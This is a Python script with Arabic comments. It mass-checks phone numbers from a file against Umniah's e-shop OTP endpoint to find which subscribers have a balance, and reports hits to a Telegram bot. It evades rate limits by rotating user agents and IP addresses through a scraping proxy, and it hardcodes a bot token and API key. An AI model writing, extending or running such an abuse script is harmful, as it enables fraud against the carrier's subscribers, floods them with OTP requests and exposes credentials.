import requests
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

# User-Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

# معلومات البوت
TELEGRAM_BOT_TOKEN = '7327256170:AAEiQ_F_BI1V9iUHzgPPui7JRwqGnj6Jys4'
TELEGRAM_CHAT_ID = '6873334348'
TELEGRAM_API = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'

# ScraperAPI Key
SCRAPER_API_KEY = 'e42b050dcb697cf3ccd3d663edf43aea'

# الإعدادات
NUM_THREADS = 5
DELAY_MIN = 0.5
DELAY_MAX = 1.5

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def check_phone(phone_number, index, total):
    """فحص رقم عبر ScraperAPI"""
    try:
        time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
        
        # الطريقة الصحيحة لاستخدام ScraperAPI مع POST
        url = 'https://eshop.umniah.com/ar/vendic/index/checkotp/'
        
        # البيانات اللي نبعتها
        payload = {
            'phone_number': phone_number,
            'request': 'generate',
            'orderid': '727165',
        }
        
        # إرسال عبر ScraperAPI (يغير الـ IP تلقائياً)
        response = requests.post(
            f'{url}?api_key={SCRAPER_API_KEY}',
            json=payload,
            headers={'user-agent': get_random_user_agent()},
            timeout=15
        )
        
        print(f"[{index}/{total}] {phone_number} - HTTP {response.status_code}")
        
        # إذا كان الرد HTML (رفض)
        if 'Request Rejected' in response.text or '<html>' in response.text.lower():
            print(f"[{index}/{total}] ⚠️ {phone_number} - الموقع رفض الطلب")
            return ('rejected', phone_number)
        
        # محاولة تحليل JSON
        try:
            data = response.json()
            
            if data.get('data1') == 'success':
                print(f"[{index}/{total}] ✅ {phone_number} - يوجد رصيد!")
                msg = f"✅ {phone_number} - يوجد رصيد"
                send_telegram(msg)
                return ('success', phone_number)
            
            elif 'balance' in str(data.get('data2', '')).lower() or 'رصيد' in str(data.get('data2', '')):
                print(f"[{index}/{total}] ❌ {phone_number} - لا يوجد رصيد")
                return ('no_balance', phone_number)
            else:
                print(f"[{index}/{total}] ❓ {phone_number} - رد: {data.get('data2', 'N/A')}")
                return ('unknown', phone_number)
        
        except:
            print(f"[{index}/{total}] ⚠️ {phone_number} - رد غير JSON")
            return ('invalid_response', phone_number)
    
    except requests.Timeout:
        print(f"[{index}/{total}] ⏱️ {phone_number} - timeout")
        return ('timeout', phone_number)
    
    except Exception as e:
        print(f"[{index}/{total}] ❌ {phone_number} - {str(e)[:50]}")
        return ('error', phone_number)

def send_telegram(message):
    """إرسال للبوت"""
    try:
        requests.post(TELEGRAM_API, json={'chat_id': TELEGRAM_CHAT_ID, 'text': message}, timeout=5)
    except:
        pass

def remove_from_file(phone_number):
    """حذف الرقم من الملف"""
    try:
        with open('lu1.txt', 'r', encoding='utf-8') as f:
            lines = f.readlines()
        with open('lu1.txt', 'w', encoding='utf-8') as f:
            f.writelines([line for line in lines if line.strip() != phone_number])
    except:
        pass

def main():
    try:
        with open('lu1.txt', 'r', encoding='utf-8') as f:
            phones = [line.strip() for line in f if line.strip()]
        
        total = len(phones)
        if total == 0:
            print("لا توجد أرقام!")
            return
        
        print(f"✅ عدد الأرقام: {total}")
        print(f"🚀 بدء الفحص (ScraperAPI يغير IP تلقائياً)...\n")
        
        success = 0
        no_balance = 0
        failed = 0
        
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            futures = {executor.submit(check_phone, phone, idx+1, total): phone 
                      for idx, phone in enumerate(phones)}
            
            for future in as_completed(futures):
                phone = futures[future]
                try:
                    status, _ = future.result(timeout=20)
                    
                    if status == 'success':
                        success += 1
                    elif status == 'no_balance':
                        no_balance += 1
                    else:
                        failed += 1
                    
                    remove_from_file(phone)
                except:
                    failed += 1
                    remove_from_file(phone)
        
        elapsed = time.time() - start
        
        print(f"\n{'='*50}")
        print(f"✅ يوجد رصيد: {success}")
        print(f"❌ لا يوجد رصيد: {no_balance}")
        print(f"⚠️ فشل: {failed}")
        print(f"⏱️ الوقت: {elapsed:.1f} ثانية")
        print(f"🚀 السرعة: {total/elapsed:.1f} رقم/ثانية")
        print(f"{'='*50}\n")

    except FileNotFoundError:
        print("❌ ملف lu1.txt غير موجود!")
    except KeyboardInterrupt:
        print("\n⛔ توقف البرنامج")

if __name__ == "__main__":
    main()
